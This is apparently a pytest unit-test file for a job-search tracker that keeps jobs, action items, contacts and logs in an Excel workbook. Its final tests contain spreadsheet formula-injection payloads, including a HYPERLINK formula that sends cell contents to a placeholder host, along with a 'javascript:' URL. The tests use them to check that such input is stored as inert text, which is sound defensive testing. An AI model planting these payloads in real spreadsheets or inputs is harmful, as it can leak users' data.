import json
from pathlib import Path

import pytest
from openpyxl import load_workbook

from careeros.models import STATUSES, TrackerRow
from careeros.tracker import Tracker

pytestmark = pytest.mark.unit


def test_init_creates_tabs_and_validation(tmp_path: Path):
    tr = Tracker(path=tmp_path / "JobTracker.xlsx")
    tr.init()
    wb = load_workbook(tr.path)
    assert wb.sheetnames == ["Jobs", "Action Items", "Contacts", "Log", "Config"]
    ws = wb["Jobs"]
    assert ws["A1"].value == "JobID" and ws["A1"].font.bold
    assert ws.freeze_panes == "A2"
    assert ws.auto_filter.ref.startswith("A1:")
    formulas = [dv.formula1 for dv in ws.data_validations.dataValidation]
    assert any("found" in f and "ghosted" in f for f in formulas)
    ai = wb["Action Items"]
    assert any(dv.formula1 == '"Y,N"' for dv in ai.data_validations.dataValidation)


def test_upsert_preserves_user_edits(tmp_path: Path):
    tr = Tracker(path=tmp_path / "JobTracker.xlsx")
    tr.init()
    assert tr.upsert_job(TrackerRow(job_id="abc123", company="Acme", role="SWE", status="found")) == "created"

    wb = load_workbook(tr.path)
    ws = wb["Jobs"]
    hdr = {c.value: c.column for c in ws[1]}
    ws.cell(row=2, column=hdr["Notes"], value="user note")
    ws.cell(row=2, column=hdr["Override"], value="A")
    wb.save(tr.path)

    assert tr.upsert_job(TrackerRow(job_id="abc123", fit=88, tier="B")) == "updated"
    job = tr.get_job("abc123")
    assert job["Notes"] == "user note"
    assert job["Override"] == "A"
    assert job["Fit"] == 88 and job["Tier"] == "B"
    assert job["Company"] == "Acme"
    assert tr.read_overrides() == {"abc123": "A"}
    assert len(tr.list_jobs()) == 1


def test_upsert_jobs_batch(tmp_path: Path):
    tr = Tracker(path=tmp_path / "JobTracker.xlsx")
    tr.init()
    tr.upsert_job({"job_id": "b1", "company": "Acme", "role": "SWE", "notes": "keep me"})
    counts = tr.upsert_jobs([
        {"job_id": "b1", "fit": 90},
        {"job_id": "b2", "company": "Beta", "role": "DE"},
        {"job_id": "b3", "company": "Gamma", "role": "MLE"},
    ])
    assert counts == {"created": 2, "updated": 1}
    jobs = {j["JobID"]: j for j in tr.list_jobs()}
    assert set(jobs) == {"b1", "b2", "b3"}
    assert jobs["b1"]["Notes"] == "keep me" and jobs["b1"]["Fit"] == 90
    assert jobs["b2"]["Status"] == "found" and jobs["b2"]["DateFound"]


def test_set_status_and_applied_count(tmp_path: Path):
    tr = Tracker(path=tmp_path / "JobTracker.xlsx")
    tr.init()
    tr.upsert_job({"job_id": "j1", "company": "Acme Inc", "role": "SWE"})
    tr.upsert_job({"job_id": "j2", "company": "Acme", "role": "DE"})
    tr.set_status("j1", "applied", note="via greenhouse")
    assert tr.get_job("j1")["Status"] == "applied"
    assert tr.get_job("j1")["DateApplied"]
    assert tr.applied_count("acme", 90) == 1
    assert tr.applied_count("Other", 90) == 0
    with pytest.raises(ValueError):
        tr.set_status("j1", "bogus")
    log_rows = list(load_workbook(tr.path)["Log"].iter_rows(min_row=2, values_only=True))
    assert any(r[1] == "j1" and "applied" in str(r[3]) for r in log_rows)


def test_action_items_and_contacts(tmp_path: Path):
    tr = Tracker(path=tmp_path / "JobTracker.xlsx")
    tr.init()
    aid = tr.add_action_item("Solve captcha", type="captcha", job_id="j1", company="Acme", priority="H")
    assert len(tr.list_action_items()) == 1
    assert tr.mark_action_done(aid)
    assert tr.list_action_items() == []
    tr.add_contact("Acme", "Jane Doe", title="Eng Manager", linkedin="https://linkedin.com/in/jd")
    tr.add_contact("Acme", "Jane Doe")
    ws = load_workbook(tr.path)["Contacts"]
    assert ws.max_row == 2


def test_locked_file_queues_and_flushes(tmp_path: Path, monkeypatch):
    tr = Tracker(path=tmp_path / "JobTracker.xlsx")
    tr.init()
    from openpyxl.workbook.workbook import Workbook

    real_save = Workbook.save

    def boom(self, filename):
        raise PermissionError(13, "locked")

    monkeypatch.setattr(Workbook, "save", boom)
    with pytest.warns(UserWarning):
        tr.upsert_job({"job_id": "q1", "company": "Acme", "role": "SWE"})
    with pytest.warns(UserWarning):
        tr.set_status("q1", "queued")
    assert tr.pending_count() == 2
    assert json.loads(tr.pending_path.read_text())[0]["op"] == "upsert_job"

    monkeypatch.setattr(Workbook, "save", real_save)
    assert tr.flush_pending() == 2
    assert tr.pending_count() == 0
    assert tr.get_job("q1")["Status"] == "queued"


def test_all_lifecycle_statuses_in_dropdown(tmp_path: Path):
    tr = Tracker(path=tmp_path / "t.xlsx")
    tr.init()
    ws = load_workbook(tr.path)["Jobs"]
    formulas = " ".join(dv.formula1 for dv in ws.data_validations.dataValidation)
    for s in STATUSES:
        assert s in formulas


def test_action_types_and_needs_column(tmp_path: Path):
    from careeros.models import ACTION_NEEDS, ACTION_TYPES

    assert {"profile_gap", "laptop_required", "scam_suspected"} <= set(ACTION_TYPES)
    tr = Tracker(path=tmp_path / "t.xlsx")
    tr.init()
    ws = load_workbook(tr.path)["Action Items"]
    headers = [c.value for c in ws[1]]
    assert "Needs" in headers
    formulas = " ".join(dv.formula1 for dv in ws.data_validations.dataValidation)
    assert "profile_gap" in formulas and "laptop_required" in formulas and "scam_suspected" in formulas
    for n in ACTION_NEEDS:
        assert n in formulas
    a1 = tr.add_action_item("fill acme bullets", type="profile_gap")
    a2 = tr.add_action_item("upload resume", type="laptop_required", needs="laptop")
    items = {it["ID"]: it for it in tr.list_action_items()}
    assert items[a1]["Needs"] == "anytime" and items[a2]["Needs"] == "laptop"


def test_legacy_workbook_gets_needs_column_on_open(tmp_path: Path):
    """An xlsx created before the Needs column existed is upgraded in place without touching other cells."""
    tr = Tracker(path=tmp_path / "t.xlsx")
    tr.init()
    wb = load_workbook(tr.path)
    ws = wb["Action Items"]
    needs_col = [c.column for c in ws[1] if c.value == "Needs"][0]
    ws.delete_cols(needs_col)
    ws.append(["old1", "2026-01-01 00:00:00", "j1", "Acme", "SWE", "review", "look at it", "", "H", "N", ""])
    wb.save(tr.path)

    aid = tr.add_action_item("new one", needs="phone", job_id="j1")
    ws = load_workbook(tr.path)["Action Items"]
    headers = [c.value for c in ws[1]]
    assert headers.index("Needs") == len(headers) - 1  # appended, nothing moved
    items = {it["ID"]: it for it in tr.list_action_items()}
    assert items["old1"]["What to do"] == "look at it" and items["old1"]["Done"] == "N"
    assert items["old1"]["Needs"] == "anytime"
    assert items[aid]["Needs"] == "phone" and items[aid]["Priority"] == "M"


def test_cli_job_status_updates_store_and_tracker(settings, monkeypatch):
    import careeros.cli as cli
    from careeros.cli import main
    from careeros.models import Posting
    from careeros.store import Store

    monkeypatch.setattr(cli, "_settings", lambda args: settings)
    store = Store(settings)
    store.save_posting(Posting(job_id="s1", company="Acme", title="SWE", ats="greenhouse"))
    tr = Tracker(settings=settings)
    tr.init()
    tr.upsert_job({"job_id": "s1", "company": "Acme", "role": "SWE"})

    assert main(["job", "status", "s1", "queued", "--note", "qa pass"]) == 0
    assert store.get_status("s1") == "queued"
    assert tr.get_job("s1")["Status"] == "queued"
    assert "qa pass" in store.read_log("s1")
    assert main(["job", "status", "nope", "queued"]) == 1


def test_legacy_type_dropdown_is_refreshed_on_open(tmp_path: Path):
    """A workbook whose Type dropdown predates scam_suspected gets the new list; nothing else changes."""
    from careeros.models import ACTION_TYPES

    tr = Tracker(path=tmp_path / "t.xlsx")
    tr.init()
    wb = load_workbook(tr.path)
    ws = wb["Action Items"]
    type_col = [c.column_letter for c in ws[1] if c.value == "Type"][0]
    for dv in list(ws.data_validations.dataValidation):
        if str(dv.sqref).startswith(f"{type_col}2"):
            dv.formula1 = '"captcha,review,other"'
    wb.save(tr.path)

    aid = tr.add_action_item("possible scam", type="scam_suspected", job_id="j1", priority="H", needs="phone")
    ws = load_workbook(tr.path)["Action Items"]
    type_dvs = [dv for dv in ws.data_validations.dataValidation if str(dv.sqref).startswith(f"{type_col}2")]
    assert len(type_dvs) == 1
    assert type_dvs[0].formula1 == '"' + ",".join(ACTION_TYPES) + '"'
    assert tr.list_action_items()[0]["ID"] == aid and tr.list_action_items()[0]["Type"] == "scam_suspected"


def test_cli_action_add_dedupe(settings, monkeypatch, capsys):
    import careeros.cli as cli
    from careeros.cli import main

    monkeypatch.setattr(cli, "_settings", lambda args: settings)
    tr = Tracker(settings=settings)
    tr.init()
    assert main(["action", "add", "review tier A", "--type", "review", "--job", "j1", "--dedupe"]) == 0
    first = tr.list_action_items()
    assert len(first) == 1
    # same job + type, open -> no-op, prints the existing id
    assert main(["action", "add", "review tier A again", "--type", "review", "--job", "j1", "--dedupe"]) == 0
    assert len(tr.list_action_items()) == 1
    assert first[0]["ID"] in capsys.readouterr().out
    # different type, or same type on another job -> added
    assert main(["action", "add", "gap", "--type", "profile_gap", "--job", "j1", "--dedupe"]) == 0
    assert main(["action", "add", "review", "--type", "review", "--job", "j2", "--dedupe"]) == 0
    assert len(tr.list_action_items()) == 3
    # without --dedupe the old behaviour (always add) is kept
    assert main(["action", "add", "review dup", "--type", "review", "--job", "j1"]) == 0
    assert len(tr.list_action_items()) == 4
    # closed items do not block a new one
    tr.mark_action_done(first[0]["ID"])
    for it in tr.list_action_items():
        if it["JobID"] == "j1" and it["Type"] == "review":
            tr.mark_action_done(it["ID"])
    assert main(["action", "add", "review after done", "--type", "review", "--job", "j1", "--dedupe"]) == 0
    assert sum(1 for it in tr.list_action_items() if it["JobID"] == "j1" and it["Type"] == "review") == 1


def test_needs_migration_is_idempotent_and_keeps_data(tmp_path: Path):
    tr = Tracker(path=tmp_path / "t.xlsx")
    tr.init()
    wb = load_workbook(tr.path)
    ws = wb["Action Items"]
    hdr = {c.value: c.column for c in ws[1]}
    ws.delete_cols(hdr["Needs"])
    ws.cell(row=2, column=1, value="old1")
    ws.cell(row=2, column=hdr["What to do"], value="legacy item")
    wb.save(tr.path)

    tr.list_action_items()
    tr.add_action_item("new", id="new1")
    tr.list_action_items()
    headers = [c.value for c in load_workbook(tr.path)["Action Items"][1] if c.value]
    assert headers.count("Needs") == 1 and headers[-1] == "Needs"
    items = {i["ID"]: i for i in tr.list_action_items()}
    assert items["old1"]["What to do"] == "legacy item" and items["old1"]["Needs"] == "anytime"
    assert items["new1"]["Needs"] == "anytime"


def test_workbook_without_action_items_sheet_opens(tmp_path: Path):
    from openpyxl import Workbook

    p = tmp_path / "t.xlsx"
    wb = Workbook()
    wb.active.title = "Jobs"
    wb.active.append(["JobID", "Status"])
    wb.save(p)
    Tracker._migrate(load_workbook(p))  # no crash, no-op


def test_corrupt_workbook_is_backed_up_and_recreated(tmp_path: Path):
    p = tmp_path / "JobTracker.xlsx"
    p.write_bytes(b"not a zip")
    tr = Tracker(path=p)
    with pytest.warns(UserWarning, match="unreadable"):
        assert tr.list_jobs() == []
    backups = list(tmp_path.glob("JobTracker.corrupt-*.xlsx"))
    assert len(backups) == 1 and backups[0].read_bytes() == b"not a zip"
    assert load_workbook(p).sheetnames[0] == "Jobs"


def test_set_status_edges(tmp_path: Path):
    tr = Tracker(path=tmp_path / "t.xlsx")
    tr.init()
    with pytest.raises(ValueError):
        tr.set_status("j1", "bogus")
    tr.set_status("new", "applied", "via CLI")  # unknown job -> row created
    job = tr.get_job("new")
    assert job["Status"] == "applied" and job["DateApplied"] and job["Notes"] == "via CLI"
    first_date = job["DateApplied"]
    tr.set_status("new", "applied", "again")
    job = tr.get_job("new")
    assert job["DateApplied"] == first_date and job["Notes"] == "via CLI\nagain"
    assert tr.get_job("missing") is None


def test_overrides_config_and_log(tmp_path: Path):
    tr = Tracker(path=tmp_path / "t.xlsx")
    tr.init()
    tr.upsert_job({"job_id": "a", "override": "skip"})
    tr.upsert_job({"job_id": "b"})
    assert tr.read_overrides() == {"a": "skip"}
    tr.set_config("last_scout", "2026-09-24 07:00")
    tr.set_config("new_key", 3)
    cfg = tr.get_config()
    assert cfg["last_scout"] == "2026-09-24 07:00" and cfg["new_key"] == 3
    tr.log("a", "test", "hello")
    rows = list(load_workbook(tr.path)["Log"].iter_rows(min_row=2, values_only=True))
    assert rows[-1][1:] == ("a", "test", "hello")


def test_row_data_requires_job_id(tmp_path: Path):
    tr = Tracker(path=tmp_path / "t.xlsx")
    with pytest.raises(ValueError):
        tr.upsert_job({"company": "Acme"})


def test_flush_while_still_locked_keeps_every_queued_op_in_order(tmp_path: Path, monkeypatch):
    tr = Tracker(path=tmp_path / "JobTracker.xlsx")
    tr.init()
    from openpyxl.workbook.workbook import Workbook

    real_save = Workbook.save

    def boom(self, filename):
        raise PermissionError(13, "locked")

    monkeypatch.setattr(Workbook, "save", boom)
    with pytest.warns(UserWarning):
        tr.upsert_job({"job_id": "q1", "company": "Acme"})
        tr.set_status("q1", "queued")
        tr.add_action_item("check q1", id="a1")
    assert tr.pending_count() == 3

    with pytest.warns(UserWarning):
        assert tr.flush_pending() == 0  # still locked: nothing replayed, nothing lost
    assert [q["op"] for q in json.loads(tr.pending_path.read_text())] == ["upsert_job", "set_status", "add_action_item"]

    monkeypatch.setattr(Workbook, "save", real_save)
    assert tr.flush_pending() == 3
    assert tr.pending_count() == 0 and not tr.pending_path.exists()
    assert tr.get_job("q1")["Status"] == "queued"
    assert [i["ID"] for i in tr.list_action_items()] == ["a1"]


def test_flush_partial_progress_keeps_unreplayed_tail(tmp_path: Path, monkeypatch):
    tr = Tracker(path=tmp_path / "JobTracker.xlsx")
    tr.init()
    tr.pending_path.write_text(json.dumps([
        {"op": "log", "payload": {"job_id": str(i), "component": "t", "message": "m"}} for i in range(3)]))
    from openpyxl.workbook.workbook import Workbook

    real_save = Workbook.save
    calls = {"n": 0}

    def second_save_locked(self, filename):
        calls["n"] += 1
        if calls["n"] == 2:
            raise PermissionError(13, "locked")
        return real_save(self, filename)

    monkeypatch.setattr(Workbook, "save", second_save_locked)
    with pytest.warns(UserWarning):
        assert tr.flush_pending() == 1
    assert [q["payload"]["job_id"] for q in json.loads(tr.pending_path.read_text())] == ["1", "2"]


@pytest.mark.parametrize("err", [OSError(35, "Resource temporarily unavailable"), OSError(16, "busy"),
                                 PermissionError(13, "locked")])
def test_lock_error_on_load_queues_and_never_resets_tracker(tmp_path: Path, monkeypatch, err):
    import careeros.tracker as tmod

    p = tmp_path / "JobTracker.xlsx"
    tr = Tracker(path=p)
    tr.upsert_job({"job_id": "keep", "company": "Acme"})

    def locked(*a, **k):
        raise err

    monkeypatch.setattr(tmod, "load_workbook", locked)
    with pytest.warns(UserWarning, match="queued"):
        assert tr.upsert_job({"job_id": "new"}) == "queued"
    monkeypatch.undo()
    assert not list(tmp_path.glob("JobTracker.corrupt-*.xlsx"))
    assert tr.get_job("keep") is not None and tr.pending_count() == 1


@pytest.mark.parametrize("evil", ['=HYPERLINK("http://x.example/?"&A1,"click")', "+1+1", "-2+3", "@SUM(A1:A2)"])
def test_untrusted_strings_are_stored_as_text_never_formulas(tmp_path: Path, evil: str):
    p = tmp_path / "JobTracker.xlsx"
    tr = Tracker(path=p)
    tr.upsert_job({"job_id": "f1", "company": evil, "role": evil, "location": evil})
    tr.add_action_item(evil, company=evil, id="a1")
    tr.add_contact(company=evil, name=evil)
    tr.log("f1", "scout", evil)
    wb = load_workbook(p)
    cells = [c for ws in wb.worksheets for row in ws.iter_rows(min_row=2) for c in row if c.value == evil]
    assert len(cells) >= 7
    assert all(c.data_type == "s" for c in cells), [(c.coordinate, c.data_type) for c in cells]
    assert tr.get_job("f1")["Company"] == evil


def test_board_url_is_text_and_only_http_links(tmp_path: Path):
    p = tmp_path / "JobTracker.xlsx"
    tr = Tracker(path=p)
    evil = '=HYPERLINK("http://x.example/?"&A1,"click")'
    tr.upsert_job({"job_id": "u1", "url": evil})
    tr.upsert_job({"job_id": "u2", "url": "javascript:alert(1)"})
    tr.upsert_job({"job_id": "u3", "url": "https://boards.greenhouse.io/acme/jobs/1"})
    ws = load_workbook(p)["Jobs"]
    hdr = {c.value: c.column for c in ws[1]}
    cells = {ws.cell(row=r, column=hdr["JobID"]).value: ws.cell(row=r, column=hdr["URL"]) for r in range(2, ws.max_row + 1)}
    assert cells["u1"].data_type == "s" and cells["u1"].value == evil and cells["u1"].hyperlink is None
    assert cells["u2"].hyperlink is None
    assert cells["u3"].hyperlink.target == "https://boards.greenhouse.io/acme/jobs/1"


def test_legacy_formula_url_cells_are_neutralised_on_open(tmp_path: Path):
    """A workbook written before URL cells were text-safe: formula URL + javascript: link get fixed on load."""
    p = tmp_path / "JobTracker.xlsx"
    tr = Tracker(path=p)
    tr.upsert_job({"job_id": "l1", "company": "Acme"})
    tr.upsert_job({"job_id": "l2", "company": "Acme", "url": "https://ok.example/1"})
    wb = load_workbook(p)
    ws = wb["Jobs"]
    hdr = {c.value: c.column for c in ws[1]}
    evil = '=HYPERLINK("http://x.example/?"&A1,"click")'
    ws.cell(row=2, column=hdr["URL"]).value = evil            # openpyxl stores it as a formula
    ws.cell(row=2, column=hdr["URL"]).hyperlink = "javascript:alert(1)"
    wb.save(p)
    assert load_workbook(p)["Jobs"].cell(row=2, column=hdr["URL"]).data_type == "f"

    tr.set_status("l2", "queued")  # any mutation opens + saves the workbook
    ws = load_workbook(p)["Jobs"]
    c1, c2 = ws.cell(row=2, column=hdr["URL"]), ws.cell(row=3, column=hdr["URL"])
    assert c1.data_type == "s" and c1.value == evil and c1.hyperlink is None
    assert c2.hyperlink.target == "https://ok.example/1"
